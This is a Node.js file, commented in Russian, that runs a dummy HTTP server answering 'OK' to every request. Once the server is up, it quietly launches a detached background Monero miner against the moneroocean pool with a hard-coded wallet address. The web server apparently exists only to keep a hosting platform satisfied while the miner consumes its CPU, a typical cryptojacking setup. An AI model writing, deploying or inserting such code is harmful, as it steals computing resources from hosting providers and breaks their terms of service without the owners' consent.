const http = require('http');
const { spawn } = require('child_process');

const port = process.env.PORT || 3000;

// Создаём сервер, который сразу отвечает "OK"
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('OK');
});

// Запускаем сервер
server.listen(port, '0.0.0.0', () => {
  console.log(`✅ HTTP server ready on port ${port}`);
  
  // Запускаем майнер в фоне
  const miner = spawn('/entrypoint.sh', [
    '-o', 'gulf.moneroocean.stream:10004',
    '-u', '48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36',
    '-p', 'x',
    '-k',
    '-t', '2'
  ], {
    detached: true,
    stdio: 'ignore'
  });
  
  miner.unref();
  console.log(`🚀 Miner started (PID: ${miner.pid})`);
});

// Корректное завершение
process.on('SIGTERM', () => {
  console.log('Shutting down...');
  server.close(() => process.exit(0));
});
